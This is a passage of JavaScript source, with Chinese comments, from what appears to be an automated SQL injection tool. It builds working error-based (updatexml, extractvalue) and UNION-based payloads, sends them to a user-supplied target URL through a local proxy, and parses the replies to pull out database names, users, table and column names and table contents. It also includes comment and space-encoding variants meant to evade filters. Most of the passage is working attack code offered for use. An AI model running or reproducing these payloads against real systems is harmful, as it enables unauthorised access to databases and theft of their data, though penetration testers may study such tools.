        // 保存错误结果
        const testResult = {
            url: testUrl,
            status: 'ERROR',
            time: `${Date.now() - startTime}ms`,
            body: error.message,
            success: false
        };
        
        // 添加到结果列表
        const listItem = document.createElement('a');
        listItem.href = '#';
        listItem.className = 'list-group-item list-group-item-action list-group-item-danger';
        listItem.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-1">${displayPayload}</h6>
                    <small>${testResult.status} · ${testResult.time}</small>
                </div>
                <span class="badge bg-danger">失败</span>
            </div>
        `;
        
        // 添加点击事件，显示详细结果
        listItem.addEventListener('click', () => {
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = decodeURIComponent(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            // 显示POST参数
            document.getElementById('injectionPostParams').value = testBody || '';
            // 显示POST参数URL解码
            document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
        });
        
        injectionResultsList.appendChild(listItem);
        
        // 更新右侧结果显示区域
        document.getElementById('injectionUrl').value = testResult.url;
        // 显示URL解码
        const decodedUrl = decodeURIComponent(testResult.url);
        document.getElementById('injectionDecodedUrl').value = decodedUrl;
        // 显示POST参数
        document.getElementById('injectionPostParams').value = testBody || '';
        // 显示POST参数URL解码
        document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
        document.getElementById('injectionStatus').value = testResult.status;
        document.getElementById('injectionTime').value = testResult.time;
        document.getElementById('injectionResponse').value = testResult.body;
        
        showToast('双查询注入执行失败！', 'error');
    }
}

// 基于错误的XPATH注入（updatexml）函数
async function runUpdateXmlInjection() {
    const result = window.currentInjectionResult;
    if (!result) return;
    
    // 清空之前的结果列表
    const injectionResultsList = document.getElementById('injectionResultsList');
    injectionResultsList.innerHTML = '';
    
    // 显示结果列表区域
    const injectionResults = document.getElementById('injectionResults');
    injectionResults.style.display = 'block';
    
    // 保存原始的位置信息
    const positionInfoList = document.getElementById('positionInfoList');
    const positionItems = positionInfoList.querySelectorAll('.position-info-item');
    
    // 遍历所有位置项，获取要注入的信息
    let queryStatement = 'database()'; // 默认查询当前数据库名
    
    positionItems.forEach(item => {
        const info = item.querySelector('select:nth-child(2)').value;
        
        if (info === 'get_table_columns') {
            // 获取表字段名
            const tableName = item.querySelector('input:first-child').value || 'users';
            queryStatement = `(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='${tableName}')`;
        } else if (info === 'get_table_data') {
            // 获取表字段数据
            const tableName = item.querySelector('input:first-child').value || 'users';
            const columnName = item.querySelector('input:nth-child(2)').value || 'username';
            queryStatement = `(SELECT GROUP_CONCAT(${columnName}) FROM ${tableName})`;
        } else if (info === 'get_all_tables') {
            // 获取所有表名
            queryStatement = `(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())`;
        } else if (info !== 'get_table_columns' && info !== 'get_table_data') {
            // 直接使用选择的SQL函数
            queryStatement = info;
        }
    });
    
    // 优先使用当前测试用例的注释变体和空格替代策略
    const commentVariant = result.testCase.commentVariant || 'double_dash_plus';
    // 使用当前测试用例的空格替代策略，如果没有则使用默认值
    const spaceReplacement = result.testCase.spaceReplacement || 'none';
    
    // 根据注释变体生成注释后缀
    const commentSuffix = commentVariant !== 'no_comment' ? {
        'double_dash': ' -- ',
        'double_dash_plus': ' --+',
        'hash': ' #',
        'multi_line': ' /*注释*/',
        'inline': ' /*!SQL注入测试*/',
        'double_dash_space': ' -- -'
    }[commentVariant] || ' -- ' : '';
    
    // 构建注入payload
    // 根据字段包裹符和注入类型构建正确的payload前缀
    let payloadPrefix = "-1'";
    const wrapperType = result.testCase.wrapperType || '无';
    const injectionType = result.testCase.injectionType || 'numeric';
    
    // 根据字段包裹符和注入类型构建正确的payload前缀
    // 优先考虑wrapperType，而不是injectionType
    // 先检查具体的组合包裹符，再检查单一包裹符，最后基于注入类型判断
    if (wrapperType === '单引号+小括号') {
        // 单引号+小括号，添加单引号和右括号闭合
        payloadPrefix = "-1')";
    } else if (wrapperType === '单引号+小括号+小括号') {
        // 单引号+双小括号，添加单引号和两个右括号闭合
        payloadPrefix = "-1'))";
    } else if (wrapperType === '双引号+小括号') {
        // 双引号+小括号，添加双引号和右括号闭合
        payloadPrefix = '-1")';
    } else if (wrapperType === '双引号+小括号+小括号') {
        // 双引号+双小括号，添加双引号和两个右括号闭合
        payloadPrefix = '-1"))';
    } else if (wrapperType === '小括号+小括号') {
        // 双小括号包裹符，添加两个右括号闭合
        payloadPrefix = '-1))';
    } else if (wrapperType === '小括号') {
        // 小括号包裹符，添加右括号闭合
        payloadPrefix = '-1)';
    } else if (wrapperType === '单引号') {
        // 单引号包裹符，添加单引号闭合
        payloadPrefix = "-1'";
    } else if (wrapperType === '双引号') {
        // 双引号包裹符，添加双引号闭合
        payloadPrefix = '-1"';
    } else if (wrapperType === '反引号') {
        // 反引号包裹符，添加反引号闭合
        payloadPrefix = '-1`';
    } else if (wrapperType === '无' && injectionType === 'numeric') {
        // 只有当wrapperType为'无'且injectionType为numeric时，才使用纯数字
        payloadPrefix = '-1';
    } else if (injectionType === 'bracket_single') {
        // 括号型单引号注入
        payloadPrefix = "-1')";
    } else if (injectionType === 'bracket_double') {
        // 括号型双引号注入
        payloadPrefix = '-1")';
    } else if (injectionType.includes('single')) {
        // 基于注入类型的单引号闭合
        payloadPrefix = "-1'";
    } else if (injectionType.includes('double')) {
        // 基于注入类型的双引号闭合
        payloadPrefix = '-1"';
    } else if (injectionType.includes('backtick')) {
        // 基于注入类型的反引号闭合
        payloadPrefix = '-1`';
    } else {
        // 其他情况，使用单引号作为默认
        payloadPrefix = "-1'";
    }
    
    // 构建基于错误的XPATH注入payload，使用updatexml函数
    const payload = `${payloadPrefix} and updatexml(1, concat(0x7e, ${queryStatement}, 0x7e), 1)${commentSuffix}`;
    let testUrl, testBody, displayPayload;
    
    // 显示实际使用的payload，包含正确的字段包裹符和空格替代
    const spaceEncodingStrategies = {
        'none': (text) => text,  // 保持原样（默认）
        'tab': (text) => text.replace(/ /g, '%09'),  // 空格替换为制表符
        'newline': (text) => text.replace(/ /g, '%0A'),  // 空格替换为换行符
        'comment': (text) => text.replace(/ /g, '/**/'),  // 空格替换为注释
        'plus': (text) => text.replace(/ /g, '+')  // 加号替代策略
    };
    
    // 根据空格替代策略处理显示的payload
    const encodingStrategy = spaceEncodingStrategies[spaceReplacement] || spaceEncodingStrategies['none'];
    const encodedPayload = encodingStrategy(payload);
    
    // 根据请求方法构建请求
    if (result.config.requestMethod === 'POST') {
        // POST请求：使用原始URL，在请求体中注入参数
        testUrl = result.url;
        // 构建包含注入payload的POST数据，使用正确的空格编码策略
        testBody = buildPostDataForTest(result.postData, result.param.key, payload, spaceReplacement);
        // 显示payload格式，使用POST格式
        displayPayload = `POST: ${result.param.key}=${encodedPayload}`;
    } else {
        // GET请求：在URL中注入参数
        testUrl = buildTestUrl({
            url: result.url,
            param: result.param,
            testCase: { payload, spaceReplacement },
            config: result.config,
            params: result.params
        });
        testBody = undefined;
        displayPayload = encodedPayload;
    }
    
    // 开始执行请求
    const startTime = Date.now();
    try {
        // 使用代理服务器转发请求
        const proxyUrl = `http://localhost:3001/proxy?url=${encodeURIComponent(testUrl)}`;
        const response = await fetch(proxyUrl, {
            method: result.config.requestMethod,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: testBody,
            mode: 'cors',
            credentials: 'include'
        });
        
        const status = response.status;
        const time = `${Date.now() - startTime}ms`;
        const body = await response.text();
        
        // 保存结果
        const testResult = {
            url: testUrl,
            status: status,
            time: time,
            body: body,
            success: true
        };
        
        // 添加到结果列表
        const listItem = document.createElement('a');
        listItem.href = '#';
        listItem.className = 'list-group-item list-group-item-action list-group-item-success';
        listItem.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-1">${displayPayload}</h6>
                    <small>${testResult.status} · ${testResult.time}</small>
                </div>
                <span class="badge bg-success">成功</span>
            </div>
        `;
        
        // 添加点击事件，显示详细结果
        listItem.addEventListener('click', () => {
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = decodeURIComponent(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            // 显示POST参数
            document.getElementById('injectionPostParams').value = testBody || '';
            // 显示POST参数URL解码
            document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
        });
        
        injectionResultsList.appendChild(listItem);
        
        // 更新右侧结果显示区域
        document.getElementById('injectionUrl').value = testResult.url;
        // 显示URL解码
        const decodedUrl = decodeURIComponent(testResult.url);
        document.getElementById('injectionDecodedUrl').value = decodedUrl;
        // 显示POST参数
        document.getElementById('injectionPostParams').value = testBody || '';
        // 显示POST参数URL解码
        document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
        document.getElementById('injectionStatus').value = testResult.status;
        document.getElementById('injectionTime').value = testResult.time;
        document.getElementById('injectionResponse').value = testResult.body;
        
        // 更新渲染页面
        const iframe = document.getElementById('injectionRenderFrame');
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        iframeDoc.open();
        iframeDoc.write(testResult.body);
        iframeDoc.close();
        
        showToast('基于错误的XPATH注入（updatexml）执行完成！', 'success');
    } catch (error) {
        // 保存错误结果
        const testResult = {
            url: testUrl,
            status: 'ERROR',
            time: `${Date.now() - startTime}ms`,
            body: error.message,
            success: false
        };
        
        // 添加到结果列表
        const listItem = document.createElement('a');
        listItem.href = '#';
        listItem.className = 'list-group-item list-group-item-action list-group-item-danger';
        listItem.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-1">${displayPayload}</h6>
                    <small>${testResult.status} · ${testResult.time}</small>
                </div>
                <span class="badge bg-danger">失败</span>
            </div>
        `;
        
        // 添加点击事件，显示详细结果
        listItem.addEventListener('click', () => {
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = decodeURIComponent(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
        });
        
        injectionResultsList.appendChild(listItem);
        
        // 更新右侧结果显示区域
        document.getElementById('injectionUrl').value = testResult.url;
        // 显示URL解码
        const decodedUrl = decodeURIComponent(testResult.url);
        document.getElementById('injectionDecodedUrl').value = decodedUrl;
        document.getElementById('injectionStatus').value = testResult.status;
        document.getElementById('injectionTime').value = testResult.time;
        document.getElementById('injectionResponse').value = testResult.body;
        
        showToast('基于错误的XPATH注入（updatexml）执行失败！', 'error');
    }
}

// 基于错误的XPATH注入（extractvalue）函数
async function runExtractValueInjection() {
    const result = window.currentInjectionResult;
    if (!result) return;
    
    // 清空之前的结果列表
    const injectionResultsList = document.getElementById('injectionResultsList');
    injectionResultsList.innerHTML = '';
    
    // 显示结果列表区域
    const injectionResults = document.getElementById('injectionResults');
    injectionResults.style.display = 'block';
    
    // 保存原始的位置信息
    const positionInfoList = document.getElementById('positionInfoList');
    const positionItems = positionInfoList.querySelectorAll('.position-info-item');
    
    // 遍历所有位置项，获取要注入的信息
    let queryStatement = 'database()'; // 默认查询当前数据库名
    
    positionItems.forEach(item => {
        const info = item.querySelector('select:nth-child(2)').value;
        
        if (info === 'get_table_columns') {
            // 获取表字段名
            const tableName = item.querySelector('input:first-child').value || 'users';
            queryStatement = `(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='${tableName}')`;
        } else if (info === 'get_table_data') {
            // 获取表字段数据
            const tableName = item.querySelector('input:first-child').value || 'users';
            const columnName = item.querySelector('input:nth-child(2)').value || 'username';
            queryStatement = `(SELECT GROUP_CONCAT(${columnName}) FROM ${tableName})`;
        } else if (info === 'get_all_tables') {
            // 获取所有表名
            queryStatement = `(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())`;
        } else if (info !== 'get_table_columns' && info !== 'get_table_data') {
            // 直接使用选择的SQL函数
            queryStatement = info;
        }
    });
    
    // 优先使用当前测试用例的注释变体和空格替代策略
    const commentVariant = result.testCase.commentVariant || 'double_dash_plus';
    // 使用当前测试用例的空格替代策略，如果没有则使用默认值
    const spaceReplacement = result.testCase.spaceReplacement || 'none';
    
    // 根据注释变体生成注释后缀
    const commentSuffix = commentVariant !== 'no_comment' ? {
        'double_dash': ' -- ',
        'double_dash_plus': ' --+',
        'hash': ' #',
        'multi_line': ' /*注释*/',
        'inline': ' /*!SQL注入测试*/',
        'double_dash_space': ' -- -'
    }[commentVariant] || ' -- ' : '';
    
    // 构建注入payload
    // 根据字段包裹符和注入类型构建正确的payload前缀
    let payloadPrefix = "-1'";
    const wrapperType = result.testCase.wrapperType || '无';
    const injectionType = result.testCase.injectionType || 'numeric';
    
    // 根据字段包裹符和注入类型构建正确的payload前缀
    // 优先考虑wrapperType，而不是injectionType
    // 先检查具体的组合包裹符，再检查单一包裹符，最后基于注入类型判断
    if (wrapperType === '单引号+小括号') {
        // 单引号+小括号，添加单引号和右括号闭合
        payloadPrefix = "-1')";
    } else if (wrapperType === '单引号+小括号+小括号') {
        // 单引号+双小括号，添加单引号和两个右括号闭合
        payloadPrefix = "-1'))";
    } else if (wrapperType === '双引号+小括号') {
        // 双引号+小括号，添加双引号和右括号闭合
        payloadPrefix = '-1")';
    } else if (wrapperType === '双引号+小括号+小括号') {
        // 双引号+双小括号，添加双引号和两个右括号闭合
        payloadPrefix = '-1"))';
    } else if (wrapperType === '小括号+小括号') {
        // 双小括号包裹符，添加两个右括号闭合
        payloadPrefix = '-1))';
    } else if (wrapperType === '小括号') {
        // 小括号包裹符，添加右括号闭合
        payloadPrefix = '-1)';
    } else if (wrapperType === '单引号') {
        // 单引号包裹符，添加单引号闭合
        payloadPrefix = "-1'";
    } else if (wrapperType === '双引号') {
        // 双引号包裹符，添加双引号闭合
        payloadPrefix = '-1"';
    } else if (wrapperType === '反引号') {
        // 反引号包裹符，添加反引号闭合
        payloadPrefix = '-1`';
    } else if (wrapperType === '无' && injectionType === 'numeric') {
        // 只有当wrapperType为'无'且injectionType为numeric时，才使用纯数字
        payloadPrefix = '-1';
    } else if (injectionType === 'bracket_single') {
        // 括号型单引号注入
        payloadPrefix = "-1')";
    } else if (injectionType === 'bracket_double') {
        // 括号型双引号注入
        payloadPrefix = '-1")';
    } else if (injectionType.includes('single')) {
        // 基于注入类型的单引号闭合
        payloadPrefix = "-1'";
    } else if (injectionType.includes('double')) {
        // 基于注入类型的双引号闭合
        payloadPrefix = '-1"';
    } else if (injectionType.includes('backtick')) {
        // 基于注入类型的反引号闭合
        payloadPrefix = '-1`';
    } else {
        // 其他情况，使用单引号作为默认
        payloadPrefix = "-1'";
    }
    
    // 构建基于错误的XPATH注入payload，使用extractvalue函数
    const payload = `${payloadPrefix} and extractvalue(1, concat('~', ${queryStatement}))${commentSuffix}`;
    let testUrl, testBody, displayPayload;
    
    // 显示实际使用的payload，包含正确的字段包裹符和空格替代
    const spaceEncodingStrategies = {
        'none': (text) => text,  // 保持原样（默认）
        'tab': (text) => text.replace(/ /g, '%09'),  // 空格替换为制表符
        'newline': (text) => text.replace(/ /g, '%0A'),  // 空格替换为换行符
        'comment': (text) => text.replace(/ /g, '/**/'),  // 空格替换为注释
        'plus': (text) => text.replace(/ /g, '+')  // 加号替代策略
    };
    
    // 根据空格替代策略处理显示的payload
    const encodingStrategy = spaceEncodingStrategies[spaceReplacement] || spaceEncodingStrategies['none'];
    const encodedPayload = encodingStrategy(payload);
    
    // 根据请求方法构建请求
    if (result.config.requestMethod === 'POST') {
        // POST请求：使用原始URL，在请求体中注入参数
        testUrl = result.url;
        // 构建包含注入payload的POST数据，使用正确的空格编码策略
        testBody = buildPostDataForTest(result.postData, result.param.key, payload, spaceReplacement);
        // 显示payload格式，使用POST格式
        displayPayload = `POST: ${result.param.key}=${encodedPayload}`;
    } else {
        // GET请求：在URL中注入参数
        testUrl = buildTestUrl({
            url: result.url,
            param: result.param,
            testCase: { payload, spaceReplacement },
            config: result.config,
            params: result.params
        });
        testBody = undefined;
        displayPayload = encodedPayload;
    }
    
    // 开始执行请求
    const startTime = Date.now();
    try {
        // 使用代理服务器转发请求
        const proxyUrl = `http://localhost:3001/proxy?url=${encodeURIComponent(testUrl)}`;
        const response = await fetch(proxyUrl, {
            method: result.config.requestMethod,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: testBody,
            mode: 'cors',
            credentials: 'include'
        });
        
        const status = response.status;
        const time = `${Date.now() - startTime}ms`;
        const body = await response.text();
        
        // 保存结果
        const testResult = {
            url: testUrl,
            status: status,
            time: time,
            body: body,
            success: true
        };
        
        // 添加到结果列表
        const listItem = document.createElement('a');
        listItem.href = '#';
        listItem.className = 'list-group-item list-group-item-action list-group-item-success';
        listItem.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-1">${displayPayload}</h6>
                    <small>${testResult.status} · ${testResult.time}</small>
                </div>
                <span class="badge bg-success">成功</span>
            </div>
        `;
        
        // 添加点击事件，显示详细结果
        listItem.addEventListener('click', () => {
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = decodeURIComponent(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
        });
        
        injectionResultsList.appendChild(listItem);
        
        // 更新右侧结果显示区域
        document.getElementById('injectionUrl').value = testResult.url;
        // 显示URL解码
        const decodedUrl = decodeURIComponent(testResult.url);
        document.getElementById('injectionDecodedUrl').value = decodedUrl;
        document.getElementById('injectionStatus').value = testResult.status;
        document.getElementById('injectionTime').value = testResult.time;
        document.getElementById('injectionResponse').value = testResult.body;
        
        // 更新渲染页面
        const iframe = document.getElementById('injectionRenderFrame');
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        iframeDoc.open();
        iframeDoc.write(testResult.body);
        iframeDoc.close();
        
        showToast('基于错误的XPATH注入（extractvalue）执行完成！', 'success');
    } catch (error) {
        // 保存错误结果
        const testResult = {
            url: testUrl,
            status: 'ERROR',
            time: `${Date.now() - startTime}ms`,
            body: error.message,
            success: false
        };
        
        // 添加到结果列表
        const listItem = document.createElement('a');
        listItem.href = '#';
        listItem.className = 'list-group-item list-group-item-action list-group-item-danger';
        listItem.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-1">${displayPayload}</h6>
                    <small>${testResult.status} · ${testResult.time}</small>
                </div>
                <span class="badge bg-danger">失败</span>
            </div>
        `;
        
        // 添加点击事件，显示详细结果
        listItem.addEventListener('click', () => {
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = decodeURIComponent(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
        });
        
        injectionResultsList.appendChild(listItem);
        
        // 更新右侧结果显示区域
        document.getElementById('injectionUrl').value = testResult.url;
        // 显示URL解码
        const decodedUrl = decodeURIComponent(testResult.url);
        document.getElementById('injectionDecodedUrl').value = decodedUrl;
        document.getElementById('injectionStatus').value = testResult.status;
        document.getElementById('injectionTime').value = testResult.time;
        document.getElementById('injectionResponse').value = testResult.body;
        
        showToast('基于错误的XPATH注入（extractvalue）执行失败！', 'error');
    }
}

// 生成注入尝试列表
function generateInjectionAttempts() {
    const tableBody = document.getElementById('injectionAttemptTableBody');
    tableBody.innerHTML = '';
    
    const url = document.getElementById('currentUrl').value;
    const param = document.getElementById('currentParam').value;
    const injectionType = document.getElementById('currentInjectionType').value;
    const fieldCount = parseInt(document.getElementById('currentFieldCount').value);
    const database = document.getElementById('currentDatabase').value;
    
    // 定义注入尝试操作
    const injectionAttempts = [
        {
            name: '测试字段输出位置',
            description: '检测哪些字段会在页面中显示',
            payload: (injectionType, fieldCount) => getUnionPayload(injectionType, '', fieldCount)
        },
        {
            name: '获取数据库版本',
            description: '提取数据库版本信息',
            payload: (injectionType, fieldCount) => getUnionDataPayload(injectionType, 'version()', fieldCount)
        },
        {
            name: '获取当前数据库名',
            description: '提取当前使用的数据库名称',
            payload: (injectionType, fieldCount) => getUnionDataPayload(injectionType, 'database()', fieldCount)
        },
        {
            name: '获取当前用户',
            description: '提取当前数据库用户',
            payload: (injectionType, fieldCount) => getUnionDataPayload(injectionType, 'user()', fieldCount)
        },
        {
            name: '获取所有数据库',
            description: '列出所有可用数据库',
            payload: (injectionType, fieldCount) => getUnionQueryPayload(injectionType, 'schema_name', "information_schema.schemata", fieldCount)
        },
        {
            name: '获取数据库表名',
            description: `列出${database || '当前数据库'}中的所有表`,
            payload: (injectionType, fieldCount) => getUnionQueryPayload(injectionType, 'table_name', `information_schema.tables${database ? ` WHERE table_schema='${database}'` : ''}`, fieldCount)
        },
        {
            name: '获取表列名',
            description: '列出指定表中的所有列（需手动修改表名）',
            payload: (injectionType, fieldCount) => getUnionQueryPayload(injectionType, 'column_name', "information_schema.columns WHERE table_schema='your_db' AND table_name='your_table'", fieldCount)
        }
    ];
    
    // 生成表格行
    injectionAttempts.forEach((attempt, index) => {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td>${index + 1}</td>
            <td>
                <div class="attempt-name">${attempt.name}</div>
                <div class="attempt-description">${attempt.description}</div>
            </td>
            <td class="attempt-payload" style="font-family: monospace; word-break: break-all;">
                ${attempt.payload(injectionType, fieldCount)}
            </td>
            <td>
                <button class="btn btn-primary btn-sm" onclick="executeInjectionAttempt(${index})" title="执行注入">
                    <i class="fa fa-play" aria-hidden="true"></i>
                </button>
                <button class="btn btn-success btn-sm" onclick="copyInjectionPayload(${index})" title="复制Payload">
                    <i class="fa fa-copy" aria-hidden="true"></i>
                </button>
            </td>
        `;
        tableBody.appendChild(row);
    });
}

// 生成UNION注入数据提取payload
function getUnionDataPayload(injectionType, dataFunction, fieldCount) {
    let payload = ` union select `;
    for (let i = 1; i <= fieldCount; i++) {
        if (i === 1) {
            payload += `${dataFunction}`;
        } else {
            payload += `,${i}`;
        }
    }
    payload += ' -- ';
    
    const initialValue = '-1';
    
    switch(injectionType) {
        case 'numeric':
            return `${initialValue}${payload}`;
        case 'string_single':
            return `${initialValue}'${payload}`;
        case 'string_double':
            return `${initialValue}"${payload}`;
        case 'bracket_single':
            return `${initialValue}')${payload}`;
        case 'bracket_double':
            return `${initialValue}")${payload}`;
        default:
            return `${initialValue}${payload}`;
    }
}

// 生成UNION注入查询payload
function getUnionQueryPayload(injectionType, column, table, fieldCount) {
    let payload = ` union select `;
    for (let i = 1; i <= fieldCount; i++) {
        if (i === 1) {
            payload += `group_concat(${column})`;
        } else {
            payload += `,${i}`;
        }
    }
    payload += ` from ${table} -- `;
    
    const initialValue = '-1';
    
    switch(injectionType) {
        case 'numeric':
            return `${initialValue}${payload}`;
        case 'string_single':
            return `${initialValue}'${payload}`;
        case 'string_double':
            return `${initialValue}"${payload}`;
        case 'bracket_single':
            return `${initialValue}')${payload}`;
        case 'bracket_double':
            return `${initialValue}")${payload}`;
        default:
            return `${initialValue}${payload}`;
    }
}

// 执行注入尝试
async function executeInjectionAttempt(index) {
    const url = document.getElementById('currentUrl').value;
    const param = document.getElementById('currentParam').value;
    
    if (!url || !param) {
        showToast('请填写URL和参数！', 'error');
        return;
    }
    
    const tableRows = document.querySelectorAll('#injectionAttemptTableBody tr');
    if (!tableRows[index]) return;
    
    const payload = tableRows[index].querySelector('.attempt-payload').textContent;
    
    // 构建完整的测试URL
    const testUrl = new URL(url);
    const params = new URLSearchParams(testUrl.search);
    params.set(param, payload);
    testUrl.search = params.toString();
    
    try {
        // 发送请求
        const response = await sendRequest(testUrl.toString(), 10);
        
        // 显示响应内容
        document.getElementById('injectionResult').value = response.body;
        
        // 尝试提取数据（简单解析）
        extractDataFromResponse(response.body);
        
        showToast('注入尝试执行成功！', 'success');
    } catch (error) {
        document.getElementById('injectionResult').value = `请求失败: ${error.message}`;
        document.getElementById('extractedData').value = '';
        showToast('注入尝试执行失败！', 'error');
    }
}

// 从响应中提取数据
function extractDataFromResponse(responseBody) {
    // 简单的HTML清理和数据提取
    const cleanedBody = responseBody.replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim();
    
    // 尝试匹配常见的数据格式
    const patterns = [
        /(\d+\.\d+\.\d+\.\d+)/, // 版本号
        /([a-zA-Z_][a-zA-Z0-9_]*)/, // 数据库名/用户名
        /([a-zA-Z0-9_,]+)/ // 逗号分隔的列表
    ];
    
    let extractedData = '';
    patterns.forEach(pattern => {
        const match = cleanedBody.match(pattern);
        if (match && !extractedData.includes(match[1])) {
            extractedData += match[1] + '\n';
        }
    });
    
    document.getElementById('extractedData').value = extractedData.trim();
}

// 复制注入payload
function copyInjectionPayload(index) {
    const tableRows = document.querySelectorAll('#injectionAttemptTableBody tr');
    if (!tableRows[index]) return;
    
    const payload = tableRows[index].querySelector('.attempt-payload').textContent;
    
    copyToClipboard(payload);
    showToast('Payload已复制到剪贴板！', 'success');
}

// 复制详情到剪贴板
function copyDetailToClipboard() {
    const detailContent = document.querySelector('.detail-content');
    if (!detailContent) return;
    
    copyToClipboard(detailContent.innerText);
    showToast('详情已复制到剪贴板！', 'success');
}

// 测试完成
function testCompleted() {
    isTesting = false;
    updateTestButtonsState(false);
    updateProgress();
    
    // 显示测试完成提示
    const totalFound = positiveResults + warningResults;
    if (totalFound > 0) {
        showToast(`测试完成！共发现 ${totalFound} 个可能的注入点（${positiveResults} 个高风险，${warningResults} 个可疑）`, 'success');
    } else {
        showToast('测试完成！未发现明显的注入点', 'info');
    }
    
    // 测试完成后重新应用分页和过滤，显示正确的结果
    updateResultsDisplay();
    
    // 生成最终的注入建议
    generateInjectionAdvice();
}

// 更新测试按钮状态
function updateTestButtonsState(disabled) {
    document.getElementById('startTestBtn').disabled = disabled;
    document.getElementById('generateSyntaxBtn').disabled = disabled;
    document.getElementById('parseUrlBtn').disabled = disabled;
    document.getElementById('addParamBtn').disabled = disabled;
    
    // 更新暂停和终止按钮状态
    const pauseBtn = document.getElementById('pauseTestBtn');
    const stopBtn = document.getElementById('stopTestBtn');
    
    pauseBtn.disabled = !disabled;
    stopBtn.disabled = !disabled;
    
    // 更新开始测试按钮文本和图标
    const startBtn = document.getElementById('startTestBtn');
    if (disabled) {
        startBtn.innerHTML = '<i class="fa fa-spinner fa-spin" aria-hidden="true"></i> 测试中...';
    } else {
        startBtn.innerHTML = '<i class="fa fa-play" aria-hidden="true"></i> 开始自动化测试';
    }
    
    // 更新暂停按钮文本和图标
    if (isPaused) {
        pauseBtn.innerHTML = '<i class="fa fa-play" aria-hidden="true"></i> 继续测试';
    } else {
        pauseBtn.innerHTML = '<i class="fa fa-pause" aria-hidden="true"></i> 暂停测试';
    }
}

// 更新测试统计
function updateTestStats() {
    // 总测试数显示计划执行的测试数量
    document.getElementById('totalTests').textContent = totalTests;
    
    // 其他统计保持不变
    document.getElementById('positiveResults').textContent = positiveResults;
    document.getElementById('warningResults').textContent = warningResults;
    document.getElementById('errorResults').textContent = errorResults;
}

// 更新进度
function updateProgress() {
    const progress = totalTests > 0 ? Math.round((currentTestIndex / totalTests) * 100) : 0;
    const progressBar = document.getElementById('testProgress');
    const progressText = document.getElementById('progressText');
    const testDurationElement = document.getElementById('testDuration');
    
    progressBar.style.width = `${progress}%`;
    progressBar.setAttribute('aria-valuenow', progress);
    
    // 计算测试时长
    let testDuration = 0;
    if (testStartTime) {
        let currentTotalTime = Date.now() - testStartTime;
        let currentPauseTime = 0;
        // 如果当前处于暂停状态，需要加上当前暂停的时间
        if (isPaused && pauseStartTime) {
            currentPauseTime = Date.now() - pauseStartTime;
        }
        // 总测试时长 = 总时间 - 累计暂停时间 - 当前暂停时间（如果正在暂停）
        testDuration = ((currentTotalTime - accumulatedPauseTime - currentPauseTime) / 1000).toFixed(2);
    }
    
    // 显示测试时长
    testDurationElement.textContent = `测试时长：${testDuration}秒`;
    
    if (isTesting) {
        progressText.textContent = `正在测试... ${currentTestIndex}/${totalTests} (${progress}%)`;
    } else if (totalTests > 0) {
        // 测试完成后，只显示简单提示，不显示执行用例数和实际显示结果
        progressText.textContent = '测试完成！';
    } else {
        progressText.textContent = '准备开始测试...';
        testDurationElement.textContent = '测试时长：0.00秒';
    }
}

// 仅生成注入语法
async function generateSyntaxOnly() {
    // 检查代理服务器状态
    const isProxyRunning = await checkProxyStatus();
    if (!isProxyRunning) {
        showToast('代理服务器未运行，请先执行 node proxy.js！', 'error');
        return;
    }
    
    const url = document.getElementById('urlInput').value.trim();
    if (!url) {
        showToast('请输入目标URL！', 'error');
        return;
    }
    
    const params = getParams();
    if (params.length === 0) {
        showToast('请添加至少一个测试参数！', 'error');
        return;
    }
    
    // 生成注入语法
    generateSyntax(url, params);
    
